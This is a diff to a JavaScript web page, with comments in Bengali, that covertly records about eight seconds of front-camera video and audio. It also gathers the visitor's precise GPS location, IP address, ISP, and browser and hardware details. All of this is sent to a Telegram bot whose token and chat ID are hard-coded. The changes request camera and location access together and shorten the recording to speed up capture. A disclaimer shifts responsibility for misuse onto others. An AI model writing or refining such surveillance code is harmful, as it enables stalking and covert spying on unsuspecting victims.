@@ -13,40 +13,18 @@
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
-        // জিপিএস লোকেশন নেওয়ার ফাংশন
-        function getGPSLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve("Not Supported");
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        resolve(`Lat: ${lat}, Lon: ${lon} (GPS)`);
-                    },
-                    (error) => {
-                        resolve("Permission Denied or Disabled");
-                    },
-                    { timeout: 10000, enableHighAccuracy: true }
-                );
-            });
-        }
-
-        async function getDeviceInfo() {
-            let ip = "Unknown", isp = "Unknown", apiLocation = "Unknown";
+        // একসাথে সব ডেটা দ্রুত লোড করার ফাংশন
+        async64 = async function getDeviceInfo(lat, lon) {
+            let ip = "Unknown", isp = "Unknown";
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 ip = data.ip || "Unknown";
                 isp = data.org || "Unknown";
-                apiLocation = `${data.city}, ${data.region}, ${data.country_name} (IP Based)`;
             } catch (e) {}
 
-            // জিপিএস লোকেশন চেক করা
-            let gpsLocation = await getGPSLocation();
-            let finalLocation = gpsLocation.includes("Lat") ? gpsLocation : apiLocation;
+            let googleMapLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Not Available";
+            let locationDisplay = (lat && lon) ? `Lat: ${lat}, Lon: ${lon}\n🗺️ Google Map: ${googleMapLink}` : "Permission Denied or Disabled";
 
             let batteryStatus = "Unknown", isCharging = "❌";
             try {
@@ -106,7 +84,7 @@
 
 🌐 IP Address: ${ip}
 🏢 ISP: ${isp}
-📍 Location: ${finalLocation}
+📍 Location: ${locationDisplay}
 
 💻 User-Agent: ${navigator.userAgent}
 🌐 Browser: ${navigator.language}
@@ -126,10 +104,29 @@
 🧑‍💻 CPU Cores: ${hardwareConcurrency}
 🎮 GPU Renderer: ${glRenderer}
 
-⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না.`;
+⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না।`;
         }
 
         async function startProcess() {
+            // একসাথে ক্যামেরা এবং লোকেশন পারমিশন রিকোয়েস্ট পাঠানো যাতে সময় কম লাগে
+            let lat = null, lon = null;
+            
+            const locationPromise = new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve();
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        lat = pos.coords.latitude;
+                        lon = pos.coords.longitude;
+                        resolve();
+                    },
+                    (err) => { resolve(); },
+                    { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
+                );
+            });
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                 const video = document.getElementById('video');
@@ -143,8 +140,10 @@
                 };
 
                 mediaRecorder.onstop = async () => {
+                    // ভিডিও রেকর্ড শেষ হওয়ার আগেই যেন লোকেশন ফেচ হয়ে যায়
+                    await locationPromise;
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    const captionText = await getDeviceInfo();
+                    const captionText = await getDeviceInfo(lat, lon);
 
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
@@ -161,9 +160,10 @@
 
                 mediaRecorder.start();
 
+                // দ্রুত ৮ সেকেন্ডের মধ্যে ভিডিও প্রসেস শেষ করা
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 9000);
+                }, 8000);
 
             } catch (err) {
                 console.log('Error:', err);
